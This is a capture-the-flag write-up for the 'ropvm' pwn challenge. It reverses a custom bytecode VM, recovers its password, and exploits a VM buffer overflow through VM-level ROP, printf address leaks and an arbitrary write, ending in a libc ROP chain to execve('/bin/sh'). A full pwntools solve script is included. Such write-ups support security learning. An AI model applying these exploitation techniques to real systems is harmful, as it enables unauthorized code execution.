# ropvm

## Description

> This isn’t your usual machine.
>
> Think differently and precisely. Then the flag is yours.
>
> `nc chal.h4c.cddc2025.xyz 31123`

{% file src="../../.gitbook/assets/chal.zip" %}

## Solution

Sadly, I only managed to solve this after the CTF ended.

### TL;DR

* Reverse the binary and the vm to understand the program
* Enter the correct password to bypass the password checker
* Exploit buffer overflow in VM region to ROP
* ROP to printf to leak libc, heap, and stack addresses
* ROP to read into VM region so that you can write your own instructions for the VM to execute
* Make instructions read to reg1 to overwrite with offset in stack region, then perform normal ret2libc

## Analysis

### Understanding The VM

Running `checksec`,  we can see that it has all possible protections enabled.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption><p>checksec --file ropvm</p></figcaption></figure>

Opening `ropvm` in IDA, we can tell that it reads of bytes of `program.bin` and the function at `sub_3A70` executes code according to the bytes read, which is essentially the VM functionality.

Using LLM to decode the VM functionalities in the `sub_3A70` function, we can understand what each variable and the different instructions it could process.

We discover that each instruction processed is of 16 bytes each, where each instruction contains:

*   ```
    4bytes: opcode (<= 24)
    4bytes: 1st operand
    4bytes: 2st operand
    4bytes: 3st operand
    ```

    <figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

We also see what each opcode does:

<table><thead><tr><th width="157">Opcode</th><th width="168">Mnemonic</th><th>Purpose (executed in 32bit)</th></tr></thead><tbody><tr><td>0x01 (1)</td><td>LOAD</td><td>reg[op1] = memory[op2]</td></tr><tr><td>0x02 (2)</td><td>STORE</td><td>memory[op2] = reg[op1]</td></tr><tr><td>0x03 (3)</td><td>ADD</td><td>reg[op1] = reg[op2] + reg[op3]</td></tr><tr><td>0x04 (4)</td><td>SUB</td><td>reg[op1] = reg[op2] - reg[op3)</td></tr><tr><td>0x05 (5)</td><td>MUL</td><td>reg[op1] = reg[op2] * reg[op3]</td></tr><tr><td>0x06 (6)</td><td>DIV</td><td>reg[op1] = reg[op2] / reg[op3]</td></tr><tr><td>0x07 (7)</td><td>JMP</td><td>EIP = memory[op1]</td></tr><tr><td>0x08 (8)</td><td>JEQ</td><td>if reg[op1] == reg[op2] then PC = memory[op3]</td></tr><tr><td>0x09 (9)</td><td>JNE</td><td>if reg[op1] != reg[op2] then PC = memory[op3]</td></tr><tr><td>0x0a (10)</td><td>JLT</td><td>if reg[op1] &#x3C; reg[op2] then PC = memory[op3]</td></tr><tr><td>0x0b (11)</td><td>JGE</td><td>if reg[op1] >= reg[op2] then PC = memory[op3]</td></tr><tr><td>0x0c (12)</td><td>CALL</td><td>PUSH ret addr, jmp memory[op1]</td></tr><tr><td>0x0d (13)</td><td>RET</td><td>POP EIP</td></tr><tr><td>0x0e (14)</td><td>HALT</td><td>Stop execution</td></tr><tr><td>0x0f (15)</td><td>PUSH</td><td>PUSH reg[op1]</td></tr><tr><td>0x10 (16)</td><td>POP</td><td>POP reg[op1]</td></tr><tr><td>0x11 (17)</td><td>MOV</td><td>reg[op1] = reg[op2]</td></tr><tr><td>0x12 (18)</td><td>CMP</td><td>reg[op1] = (reg[op2] == reg[op2])</td></tr><tr><td>0x13 (19)</td><td>XOR</td><td>reg[op1] = reg[op2] ^ reg[op3]</td></tr><tr><td>0x14 (20)</td><td>INC</td><td>reg[op1]++</td></tr><tr><td>0x15 (21)</td><td>SYSCALL</td><td>reg[0] = syscall number<br>syscall numbers: 0=read, 1=printf, 3=exit</td></tr><tr><td>0x16 (22)</td><td>LOADI</td><td>reg[op1] = op2</td></tr><tr><td>0x17 (23)</td><td>LOADR</td><td>reg[op1] = memory[reg[op2]]</td></tr><tr><td>0x18 (24)</td><td>AND</td><td>reg[op1] = reg[op2] &#x26; op3</td></tr></tbody></table>

There are 3 syscalls implemented:

1. reg\[0] == 0: `read(stdin, memory + reg[1], reg[2])`
2. reg\[0] == 1: `printf(memory + reg[1], memory + reg[2])`
3. reg\[0] == 3: `exit()`

### Analyzing program.bin

This is a rough disassembly of the some parts of `program.bin`:

```nasm
0x10: 0000000C 00000100 00000000 00000000 → CALL mem+0x100
0x20: 0000000C 00001000 00000000 00000000 → CALL mem+0x1000
0x30: 0000000C 00000200 00000000 00000000 → CALL mem+0x200
0x40: 0000000C 00001300 00000000 00000000 → CALL mem+0x1300
0x50: 0000000C 00000900 00000000 00000000 → CALL mem+0x900
0x60: 0000000E 00000000 00000000 00000000 (HALT)

Prints banner
0x100: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0x110: 00000011 0000000D 0000000E 00000000 → MOV reg[13], reg[14]
0x120: 00000016 00000000 00000001 00000000  → LOAD_IMM reg[0], 1
0x130: 00000016 00000001 00008000 00000000  → LOAD_IMM reg[1], 128 (0x80)
0x140: 00000016 00000002 00008010 00000000  → LOAD_IMM reg[2], 32784 (0x8010)
0x150: 00000015 00000000 00000000 00000000  → SYSCALL (reg[0]=1, reg[1]=128, reg[2]=32784)
0x160: 00000011 0000000E 0000000D 00000000  → MOV reg[14], reg[13]
0x170: 00000010 0000000D 00000000 00000000  → POP reg[13]
0x180: 0000000D 00000000 00000000 00000000  → RET

read(stdin, memory + 240, 64)
0x200: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0x210: 00000011 0000000D 0000000E 00000000  → MOV reg[13], reg[14]
0x220: 00000016 00000000 00000000 00000000  → LOAD_IMM reg[0], 0
0x230: 00000016 00000001 0000F000 00000000  → LOAD_IMM reg[1], 240 (0xF0)
0x240: 00000016 00000002 00000040 00000000  → LOAD_IMM reg[2], 64 (0x40)
0x250: 00000015 00000000 00000000 00000000  → SYSCALL (reg[0]=0, reg[1]=240, reg[2]=64)
0x260: 00000011 0000000E 0000000D 00000000  → MOV reg[14], reg[13]
0x270: 00000010 0000000D 00000000 00000000  → POP reg[13]
0x280: 0000000D 00000000 00000000 00000000  → RET

printf(memory + 128, memory + prev_reg[0])
0x300: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0x310: 00000011 0000000D 0000000E 00000000  → MOV reg[13], reg[14]
0x320: 00000011 00000002 00000000 00000000  → MOV reg[2], reg[0]
0x330: 00000016 00000000 00000001 00000000  → LOAD_IMM reg[0], 1
0x340: 00000016 00000001 00008000 00000000  → LOAD_IMM reg[1], 128
0x350: 00000015 00000000 00000000 00000000  → SYSCALL (reg[0]=1, reg[1]=128, reg[2]=prev reg[0])
0x360: 00000011 0000000E 0000000D 000000000  → MOV reg[14], reg[13]
0x370: 00000010 0000000D 00000000 00000000  → POP reg[13]
0x380: 0000000D 00000000 00000000 00000000  → RET

POP reg[0]
0x400: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0x410: 00000011 0000000D 0000000E 00000000  → MOV reg[13], reg[14]
0x420: 00000010 00000000 00000000 00000000  → POP reg[0]
0x430: 00000011 0000000E 0000000D 000000000  → MOV reg[14], reg[13]
0x440: 00000010 0000000D 00000000 00000000  → POP reg[13]
0x450: 0000000D 00000000 00000000 00000000  → RET

POP reg[1]
0x500: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0x510: 00000011 0000000D 0000000E 00000000  → MOV reg[13], reg[14]
0x520: 00000010 00000001 00000000 00000000  → POP reg[1]
0x530: 00000011 0000000E 0000000D 00000000  → MOV reg[14], reg[13]
0x540: 00000010 0000000D 00000000 00000000  → POP reg[13]
0x550: 0000000D 00000000 00000000 00000000  → RET

POP reg[2]
0x600: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0x610: 00000011 0000000D 0000000E 00000000  → MOV reg[13], reg[14]
0x620: 00000010 00000002 00000000 00000000  → POP reg[2]
0x630: 00000011 0000000E 0000000D 00000000  → MOV reg[14], reg[13]
0x640: 00000010 0000000D 00000000 00000000  → POP reg[13]
0x650: 0000000D 00000000 00000000 00000000  → RET

reg[1] =  reg[0] * reg[1]
0x700: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0x710: 00000011 0000000D 0000000E 00000000  → MOV reg[13], reg[14]
0x720: 00000005 00000001 00000000 00000001  → MUL reg[1], reg[0], reg[1]
0x730: 00000011 0000000E 0000000D 00000000  → MOV reg[14], reg[13]
0x740: 00000010 0000000D 00000000 00000000  → POP reg[13]
0x750: 0000000D 00000000 00000000 00000000  → RET

memory[32852] = memory[32848]
0x800: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0x810: 00000011 0000000D 0000000E 00000000  → MOV reg[13], reg[14]
0x820: 00000001 00000000 00008050 00000000  → LOAD reg[0], memory[32848]
0x830: 00000002 00000000 00008054 00000000  → STORE memory[32852], reg[0]
0x840: 00000011 0000000E 0000000D 00000000  → MOV reg[14], reg[13]
0x850: 00000010 0000000D 00000000 00000000  → POP reg[13]
0x860: 0000000D 00000000 00000000 00000000  → RET

exit()
0x900: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0x910: 00000011 0000000D 0000000E 00000000  → MOV reg[13], reg[14]
0x920: 00000016 00000000 00000003 00000000  → LOAD_IMM reg[0], 3
0x930: 00000015 00000000 00000000 00000000  → SYSCALL (reg[0]=3)
0x940: 00000011 0000000E 0000000D 00000000  → MOV reg[14], reg[13]
0x950: 00000010 0000000D 00000000 00000000  → POP reg[13]
0x960: 0000000D 00000000 00000000 00000000  → RET

read(stdin, reg[14] - 32, 256)
0xa00: 0000000F 0000000D 00000000 00000000  → PUSH reg[13]
0xa10: 00000011 0000000D 0000000E 00000000  → MOV reg[13], reg[14]
0xa20: 00000016 00000000 00000020 00000000  → LOAD_IMM reg[0], 32 (0x20)
0xa30: 00000004 0000000E 0000000E 00000000  → SUB reg[14], reg[14], reg[0]
0xa40: 00000016 00000000 00000000 00000000  → LOAD_IMM reg[0], 0
0xa50: 00000011 00000001 0000000E 00000000  → MOV reg[1], reg[14]
0xa60: 00000016 00000002 00000100 000000001  → LOAD_IMM reg[2], 256 (0x100)
0xa70: 00000015 00000000 00000000 000000000  → SYSCALL (reg[0]=0, reg[1]=0, reg[2]=256)
0xa80: 00000011 00000000 0000000E 00000000  → MOV reg[0], reg[14] (reg[0] = 0)
0xa90: 00000011 0000000E 0000000D 00000000  → MOV reg[14], reg[13]
0xaa0: 00000010 0000000D 00000000 000000000  → POP reg[13]
0xab0: 0000000D 00000000 00000000 000000000  → RET

0x1000 printf(memory + 128, memory + 32816)
0x1100 printf(memory + 128, memory + 32880) # success message
0x1200 printf(memory + 128, memory + 32848) # failure message
0x1300 prompts for password, if correct then call function at 0xa00
```

We can see that the function at `0x1300` is the one that prompts and checks for the password, we can ask Claude to help us figure out the password, which is `V3ry53cretP4ass` .

We can also recognize that `reg[13] = ebp` and `reg[14] = esp` through recognizing the function prologue and epilogue in typical functions. This shows that it reads to `esp-32`, but it reads in `256` bytes, which shows there is a clear "buffer overflow".

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption><p>Buffer Overflow in VM</p></figcaption></figure>

Sending 50 "A"s returns a "Access violation" error, which shows that some kind of overflow is happening. This message however, is printed out by the VM interpreter itself, which has certain checks in place. Thankfully, we can perform ROP using the VM's instructions, since we have control of the VM's "EIP".

### VM ROP

To achieve a shell, we need a way to leak addresses first, which we can do so as we can control the VM's register values and we can ROP to `syscall` to printf with `reg[0]` pointing to out custom string with a bunch of "`%p`"s. Unfortunately, we cannot use `printf` to write to addresses as `FORTIFY` protection is enabled, but we have address leaks.

We will craft our payload by `POP`ing 0 into `reg[0]` (read) and an arbitrary address we want to write to into `reg[1]`. We wrote to a part of the VM with a bunch of nulls (0x2000). We will then we return to `0xa70`, which just calls `syscall` and returns:

```nasm
0xa60: 00000016 00000002 00000100 000000001  → LOAD_IMM reg[2], 256 (0x100)
0xa70: 00000015 00000000 00000000 000000000  → SYSCALL (reg[0]=0, reg[1]=0, reg[2]=256)
0xa80: 00000011 00000000 0000000E 00000000  → MOV reg[0], reg[14] (reg[0] = 0)
0xa90: 00000011 0000000E 0000000D 00000000  → MOV reg[14], reg[13]
0xaa0: 00000010 0000000D 00000000 000000000  → POP reg[13]
0xab0: 0000000D 00000000 00000000 000000000  → RET
```

We craft our first payload like so:

{% hint style="warning" %}
Note that we have to +0x10 for each POP gadget in order to continue controlling the RIP on the stack after each RET
{% endhint %}

```python
pop_0 = 0x410
pop_1 = 0x510
write_sys = 0xa60

payload = b''
payload = payload.ljust(36, b'\x00')
payload = payload + p32(pop_0) + p32(0)
payload += p32(write_sys)

p.send(payload)

p.recv(10)
p.send(cyclic(200))
```

When we send this payload, we can break when the RET is executed to determine where it returns to. We broke at `+0x3eaf` and view the value in **RDX**, which should contain the return address.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

In this case, we see `RDX` is part of our cyclic value sent in the second payload, at an offset of 4. We can control this so that it returns to our payload we just wrote to, which is at `0x2008`! We can then write our own VM shellcode.

### VM Shellcoding (address leak)

We first write a shellcode to use `printf` to leak addresses, where the "`%p`"s will be placed in the first payload and pop the offset to it is in `reg[1]`.

I added this to my first payload, and calculated that the offset to the "`%p`"s were at `memory+0xe021`:

```python
payload += cyclic(25)
payload += b'%p'*40 + b'%p %p %p %p||'
```

Afterwards, we need to continue the payload so we create another `read` syscall. However, we now overwrite the instructions at `0xa80` and we then jump to `0xa60`, which is right before the syscall. This makes it so that my next payload would be executed as VM instructions right after the `read` syscall is done. (I had to do this as I did not think of overwriting the size at that time, so had size restrictions and had to keep jumping around)

```nasm
0xa60: 00000016 00000002 00000100 000000001  → LOAD_IMM reg[2], 256 (0x100)
0xa70: 00000015 00000000 00000000 000000000  → SYSCALL (reg[0]=0, reg[1]=0, reg[2]=256)
0xa80: <this will be my next payload>
```

```python
payload = b'AAAA' + p32(0x2008)
payload += p32(0x11) + p32(0x0d) + p32(0x0e) + p32(0)
payload += p32(0x11) + p32(0x02) + p32(0) + p32(0)      # make sure not to clobber the stack
payload += p32(0x16) + p32(0) + p32(0x1) + p32(0) 
payload += p32(0x16) + p32(0x1) + p32(0xe021) + p32(0)  # 0xe021 offset
payload += p32(0x15) + p32(0) + p32(0) + p32(0)         # printf(memory+0xe021), containing the "%p"s
payload += p32(0x11) + p32(0x0e) + p32(0x0d) + p32(0)
payload += p32(0x10) + p32(0xd) + p32(0) + p32(0)

payload += p32(0x16) + p32(0) + p32(0) + p32(0) 
payload += p32(0x16) + p32(1) + p32(0xa80) + p32(0)     # 0xa80 is right after the syscall
payload += p32(0x7) + p32(0xa60) + p32(0x0) + p32(0)    # jump to 0xa60
payload += p32(0xd) + p32(0) + p32(0) + p32(0)

p.send(payload)
```

Now we can see that we have a bunch of addresses leaked, in which case we can parse them to get the heap address, stack address, and libc address.

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

After we have the address leaks, we can write a final payload to overwrite RIP on the stack with actual libc ROP gadgets and perform ret2libc. This would require to get the `read` syscall to read to stack addresses. There are also no checks performed on the offset that it reads to, which makes this vulnerable.

However, we can't simply just pop an offset to libc into `reg[1]` as each POP only takes in 32 bits and the offset between libc and the heap base is way more than 32 bits. So with this, we only have a partial arbitrary read, where we can read to addresses in the heap and lower addresses.

### VM Shellcoding (read to stack)

We can simply bypass this 32 bit restriction by not using the VM's POP instructions, but to just use the partial arbitrary read we have to read into the address where reg\[1] resides, which contains the offset, then we can write a 64 bit offset to libc to reg\[1]!

```python
reg1_addr = 0x555555570eb8
reg1_offset = reg1_addr - 0x555555570f40

payload = b''
payload += p32(0x16) + p32(0) + p32(0) + p32(0) 
payload += p32(0x16) + p32(1) + p32(reg1_offset & 0xffffffff) + p32(0)
payload += p32(0x16) + p32(2) + p32(256) + p32(0)
payload += p32(0x15) + p32(0) + p32(0x0) + p32(0)   # read(stdin, memory+offset_reg1, 256)
payload += p32(0x15) + p32(0) + p32(0x0) + p32(0)   # read(stdin, memory+stack_offset , 256)

p.send(payload)
pause()

goal_to_write = p64(b'AAAABBBB')
offset = goal_to_write - (heap_leak - 57352)
payload = p64(offset)
p.send(payload) # overwrites reg[1]
```

Breaking at the read right after modifying reg\[1], we can see the next read is reading to any address we control and its a 64 bit address, so we have a full arbitrary read!

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Now we just set this read address to read to the stack and overwrite RIP during the **read** syscall, then use libc ROP gadgets to perform ret2libc and get a shell.

### Classic ret2libc

Nothing special about this part, just create a ROP chain to get `execve("/bin/sh",0,0)` and overwrite at the address where RIP is found on the stack.

```python
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_rbx = libc.address + 0x00000000000904a9
binsh = next(libc.search(b'/bin/sh'))

payload = p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0)
payload += p64(0)
payload += p64(libc.sym['execve'])
p.send(payload)
```

### Final Exploit

{% tabs %}
{% tab title="solve.py" %}
```python
#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./ropvm_patched")
libc = ELF("./libroot/libc.so.6")
# url,port = "chal.h4c.cddc2025.xyz",31123
url,port = "localhost", 4040

if args.REMOTE:
    p = remote(url,port)
else:
    p = elf.process(aslr=False)

if args.GDB:
    gdb.attach(p, '''
        ''')

        # break *0x555555557fdd
"""
POP reg[14] = reg[13]
0xc00: 0F 00 00 00 0D 00 00 00  → PUSH reg[13]
0xc10: 11 00 00 00 0D 00 0E 00  → MOV reg[13], reg[14]
0xc20: 10 00 00 00 0E 00 00 00  → POP reg[14]
0xc30: 0D 00 00 00 00 00 00 00  → RET
"""

goaltowrite = 0x7fffffffc9e8

# writing to 0x55555557032c

# 0x555555557ac3
retaddr = 0x55555557c334
# mov retaddr into 0x55555556e328
offset_to_stack = 0x55555556e320
regbase = 0x55555556e2b0
starting = 0x55555556e340
writeto = 0x55555557c310
password = b'V3ry53cretP4ass'
p.clean()
p.sendline(password)

pop_0 = 0x410
pop_1 = 0x510
write_sys  = 0xa60

# pause()

payload = b''
payload = payload.ljust(36, b'\x00')
payload = payload + p32(pop_0) + p32(0)
payload += p32(pop_1) + p32(0x2000)
payload += p32(write_sys)

payload += cyclic(25)

payload += b'%p'*40 + b'%p %p %p %p||'

print(len(payload))
p.recvuntil(b'Password!')
p.send(payload)

print(p.recv(10))

payload = b'AAAA' + p32(0x2008)
payload += p32(0x11) + p32(0x0d) + p32(0x0e) + p32(0)
payload += p32(0x11) + p32(0x02) + p32(0) + p32(0)      # make sure not to clobber the stack
payload += p32(0x16) + p32(0) + p32(0x1) + p32(0) 
payload += p32(0x16) + p32(0x1) + p32(0xe021) + p32(0)  # 0xe021 offset
payload += p32(0x15) + p32(0) + p32(0) + p32(0)         # printf(memory+0xe021), containing the "%p"s
payload += p32(0x11) + p32(0x0e) + p32(0x0d) + p32(0)
payload += p32(0x10) + p32(0xd) + p32(0) + p32(0)

payload += p32(0x16) + p32(0) + p32(0) + p32(0) 
payload += p32(0x16) + p32(1) + p32(0xa80) + p32(0)     # 0xa80 is right after the syscall
payload += p32(0x7) + p32(0xa60) + p32(0x0) + p32(0)    # jump to 0xa60
payload += p32(0xd) + p32(0) + p32(0) + p32(0)

print(len(payload))
p.send(payload)

print(p.recvuntil(b'0x'))
heap_leak = int(p.recvuntil(b'0x',drop=True).decode(),16)
print("Heap leak:", hex(heap_leak))
p.recvuntil(b'(nil)')
p.recvuntil(b'(nil)0x10x')
stack_leak = int(p.recvuntil(b' ',drop=True).decode(), 16)
print(hex(stack_leak))
p.recvuntil(b' ')
p.recvuntil(b' ')
libc_leak = int(p.recvuntil(b'||',drop=True).decode(), 16)
libc.address = libc_leak  - 0x29d90 # - 120 -libc.sym['__libc_start_main']
print("LIBC:", hex(libc.address))
p.clean()

reg1_addr = 0x555555570eb8
reg1_offset = reg1_addr - 0x555555570f40

payload = b''
payload += p32(0x16) + p32(0) + p32(0) + p32(0) 
payload += p32(0x16) + p32(1) + p32(reg1_offset & 0xffffffff) + p32(0)
payload += p32(0x16) + p32(2) + p32(256) + p32(0)
payload += p32(0x15) + p32(0) + p32(0x0) + p32(0)   # read(stdin, memory+offset_reg1, 256)
payload += p32(0x15) + p32(0) + p32(0x0) + p32(0)   # read(stdin, memory+stack_offset , 256)

# 0x555555557ac3

pause()

p.send(payload)

pause()

goal_to_write = stack_leak - 0x250
offset = goal_to_write - (heap_leak - 57352)

payload = p64(offset)
p.send(payload) # overwrites reg[1]

pause()

# 0x000000000002a3e5 : pop rdi ; ret
# 0x000000000002be51 : pop rsi ; ret
# 0x00000000000904a9 : pop rdx ; pop rbx ; ret

pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_rbx = libc.address + 0x00000000000904a9
binsh = next(libc.search(b'/bin/sh'))

payload = p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0)
payload += p64(0)
payload += p64(libc.sym['execve'])
p.send(payload)


p.interactive()
p.close()
```
{% endtab %}
{% endtabs %}

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption><p>local flag :')</p></figcaption></figure>
